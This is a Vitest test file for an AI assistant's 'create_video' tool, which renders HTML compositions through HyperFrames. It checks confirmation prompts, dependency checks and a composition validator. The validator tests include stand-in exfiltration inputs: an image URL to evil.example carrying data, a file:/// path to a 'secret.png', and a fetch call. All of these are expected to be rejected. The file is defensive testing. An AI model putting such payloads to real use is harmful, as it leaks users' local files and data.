import { mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { logger } from '../../logging/logger';
import type { Tool, ToolOutput } from '../types';
import {
  HYPERFRAMES_PACKAGE,
  checkComposition,
  createVideoTools,
  nodeRunsHyperFrames,
  videoSlug,
} from './video';

const ctx = {
  signal: new AbortController().signal,
  conversationId: 'c',
  turnId: 't',
  tainted: false,
  logger,
};
const text = (o: ToolOutput): string => o.content.map((c) => ('text' in c ? c.text : '')).join(' ');

const HTML = `<!doctype html><html><body>
<div id="root" data-composition-id="main" data-width="1920" data-height="1080" data-duration="5">
<section class="clip" data-start="0" data-duration="5"><h1 id="t">Hello</h1></section></div>
<script>const tl = gsap.timeline({ paused: true }); window.__timelines["main"] = tl;</script>
</body></html>`;

function setup(
  over: { node?: string | null; ffmpeg?: boolean; code?: number; writes?: boolean } = {},
) {
  const videos = mkdtempSync(join(tmpdir(), 'jarvis-video-'));
  const renders: Array<{ args: string[]; cwd: string }> = [];
  const [tool] = createVideoTools({
    videosDir: () => videos,
    env: {
      node: async () =>
        over.node === null ? null : { exe: 'C:\\node\\node.exe', version: over.node ?? 'v24.21.0' },
      ffmpeg: async () => over.ffmpeg ?? true,
      render: async (args, cwd) => {
        renders.push({ args, cwd });
        const out = args[args.indexOf('--output') + 1] as string;
        if (over.writes !== false) writeFileSync(out, 'video-bytes');
        return {
          code: over.code ?? 0,
          out: over.code ? 'lint error: gsap_css_transform_conflict' : 'done',
        };
      },
    },
  }) as [Tool];
  const run = (input: unknown): Promise<ToolOutput> => tool.run(tool.input.parse(input), ctx);
  return { tool, run, renders, videos };
}

describe('create_video (idea from heygen-com/hyperframes)', () => {
  it('writes the composition and renders it into Videos\\Jarvis, asking first', async () => {
    const t = setup();
    expect(t.tool.tier).toBe('CONFIRM');
    // The confirmation shows the composition itself, not just its title.
    const shown = t.tool.confirm?.({
      title: 'Launch',
      html: HTML,
      quality: 'looks',
      format: 'mp4',
    });
    expect(shown?.detailsKind).toBe('code');
    expect(shown?.details).toContain('data-composition-id="main"');
    expect(t.tool.guards?.({})).toEqual({ paths: [t.videos] });
    const out = await t.run({ title: 'Launch: v2.12!', html: HTML });
    expect(out.isError).toBeFalsy();
    expect(t.renders[0]?.args).toEqual([
      'render',
      '.',
      '--output',
      expect.stringMatching(/Launch v2 12\.mp4$/),
      '--quality',
      'looks',
      '--format',
      'mp4',
      '--quiet',
    ]);
    expect(readFileSync(join(t.renders[0]?.cwd ?? '', 'index.html'), 'utf8')).toBe(HTML);
    expect(text(out)).toMatch(/Video saved: .*Launch v2 12\.mp4/);
  });

  it('says what to install when Node or FFmpeg is missing, before rendering', async () => {
    const oldNode = setup({ node: 'v20.11.0' });
    expect(text(await oldNode.run({ title: 'x1', html: HTML }))).toMatch(
      /Node\.js 22 or later.*v20\.11\.0/,
    );
    const noFfmpeg = setup({ ffmpeg: false });
    expect(text(await noFfmpeg.run({ title: 'x1', html: HTML }))).toMatch(
      /winget install --id Gyan\.FFmpeg/,
    );
    expect(oldNode.renders).toHaveLength(0);
    expect(noFfmpeg.renders).toHaveLength(0);
  });

  it('returns HyperFrames’s own message when a render fails, so Jarvis can fix the HTML', async () => {
    const t = setup({ code: 1, writes: false });
    const out = await t.run({ title: 'Broken', html: HTML });
    expect(out.isError).toBe(true);
    expect(text(out)).toContain('gsap_css_transform_conflict');
  });

  it('rejects compositions that cannot render', () => {
    expect(checkComposition(HTML)).toBeNull();
    expect(checkComposition('<div data-width="1" data-height="1"></div>')).toMatch(
      /data-composition-id/,
    );
    expect(
      checkComposition('<template><div data-composition-id="a" data-width="1" data-height="1">'),
    ).toMatch(/template/);
    // Nothing on this PC and no site but the script/font CDNs (Claude may have just read a web page).
    expect(checkComposition(`${HTML}<img src="file:///C:/Users/x/secret.png">`)).toMatch(/file:/);
    expect(checkComposition(`${HTML}<img src="https://evil.example/?d=1">`)).toMatch(
      /evil\.example/,
    );
    expect(checkComposition(`${HTML}<script>fetch('/x')</script>`)).toMatch(/network/);
    expect(
      checkComposition(
        `${HTML}<script src="https://cdn.jsdelivr.net/npm/gsap@3/dist/gsap.min.js"></script><svg xmlns="http://www.w3.org/2000/svg"></svg>`,
      ),
    ).toBeNull();
    expect(videoSlug('CON')).toBe('Video CON');
    expect(nodeRunsHyperFrames('v22.0.0')).toBe(true);
    expect(nodeRunsHyperFrames('v21.9.0')).toBe(false);
    expect(videoSlug('a/b\\c:*?')).toBe('a b c');
    expect(HYPERFRAMES_PACKAGE).toMatch(/^hyperframes@\d+\.\d+\.\d+$/);
  });
});
